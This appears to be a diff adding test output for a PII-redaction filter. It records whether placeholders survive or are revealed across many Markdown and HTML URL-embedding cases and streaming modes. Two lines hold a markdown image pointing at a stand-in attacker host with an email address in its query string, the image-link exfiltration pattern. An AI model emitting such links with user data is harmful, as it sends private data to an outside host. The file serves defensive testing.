@@ -1,0 +1,35 @@
+URL md image: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL md ( space //: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL ref def //: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL angle dest space: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL img src //: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL img src quoted space: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL a href quoted space: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL md ( newline //: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL md ( newline relative: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL md (< newline: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL src= newline quoted: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL src=" newline value: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL ref def newline: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL img newline src: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL CR break: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL nested parens: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL srcset: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL SRC upper spaced: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL svg xlink:href: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL css url //: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL meta refresh: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL U+2028 in target: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL long prose then target: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL src + 9000 spaces + =: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL target opened 9000 chars back: one=kept stream1=kept live1=kept stream7=kept live7=kept stream50=kept live50=kept
+URL prose next line after open quote: one=REVEALED stream1=REVEALED live1=kept stream7=REVEALED live7=kept stream50=REVEALED live50=kept
+URL plain: one=REVEALED stream1=REVEALED live1=kept stream7=REVEALED live7=kept stream50=REVEALED live50=REVEALED
+URL apostrophe then next line: one=REVEALED stream1=REVEALED live1=kept stream7=REVEALED live7=kept stream50=REVEALED live50=REVEALED
+URL line after a closed link: one=REVEALED stream1=REVEALED live1=kept stream7=REVEALED live7=kept stream50=REVEALED live50=REVEALED
+URL placeholder before marker: one=kept stream1=REVEALED live1=kept stream7=REVEALED live7=kept stream50=kept live50=kept
+RESUME same reader: '![x](https://evil.example/?q=<<PII_1>>)'
+RESUME new reader after e1: '![x](https://evil.example/?q=ali@example.test)' -> REVEALED
+BOUND numbers [99999999, 3]
+BOUND after reserve of 8-digit max -> <<PII_100000000>>
+BOUND huge ignored -> <<PII_1>>
